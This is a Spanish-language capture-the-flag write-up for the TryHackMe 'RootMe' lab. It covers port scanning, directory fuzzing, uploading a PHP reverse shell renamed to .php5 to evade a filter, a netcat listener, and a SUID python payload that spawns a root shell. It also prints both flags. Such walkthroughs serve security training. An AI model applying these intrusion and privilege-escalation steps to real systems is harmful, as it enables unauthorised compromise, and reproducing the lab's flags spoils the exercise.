# RootMe

## Escaneo de puertos

Ejecutamos un mapeo de puertos con`nmap`para obtener todos los puertos y servicios abiertos de la máquina vulnerable.

```
sudo nmap -sV -T4 -p- 10.10.66.233
```

Tenemos ssh y http (Apache) como puertos abiertos disponibles.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image.png]]

## Enumeración web

Usamos el comando`gobuster`para hacer fuzzing y obtener más directorios ocultos en la página web.

```
gobuster dir -u 10.10.66.233 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

De momento encontramos dos directorios potenciales,`/uploads`y`/panel`.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-1.png]]

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-2.png]]

## Reverse shell

Vamos a buscar una forma de obtener una reverse shell y obtener la flag.

https://github.com/pentestmonkey/php-reverse-shell

En esta página copiamos el contenido del fichero`php-reverse-shell.php`en otro que vamos a crear en nuestro sistema llamado`shell.php`.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-3.png]]

Modificamos el parámetro de`$ip` (nuestra IP en kali) en el fichero.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-4.png]]

Subimos el fichero a la página pero no permite subir archivos`.php`.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-5.png]]

Probamos con`.php2`, `.php3`,`.php4`,`.php5`porque buscando en Google podemos que los archivos php pueden ir con distintas extensiones. Funciona renombrando el fichero a`.php5`.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-6.png]]

Iniciamos el puerto 1234 en escucha en nuestra terminal.

```
nc -lvnp 1234
```

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-7.png]]

En`/uploads`está el fichero que hemos subido.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-8.png]]

Hacemos clic en él y estamos dentro.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-9.png]]

En el fichero de apache está la flag del user.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-10.png]]

```
THM{y0u_g0t_a_sh3ll}
```

## Escalada de privilegios

Buscamos un archivo con permisos de SUID en el sistema con el siguiente comando:

```
find / -user root -perm /4000 2>/dev/null
```

El fichero`/usr/bin/python`puede ser interesante.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-11.png]]

Buscamos en la siguiente página para saber como explotar binarios de Python con SUID:

https://gtfobins.github.io/

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-12.png]]

Ejecutamos el siguiente payload:

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Y ya somos root en el sistema.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-13.png]]

Obtenemos la flag del root.

![[Hacking_Etico/TryHackMe_WriteUps/RootMe/images/image-14.png]]

```
THM{pr1v1l3g3_3sc4l4t10n}
```

















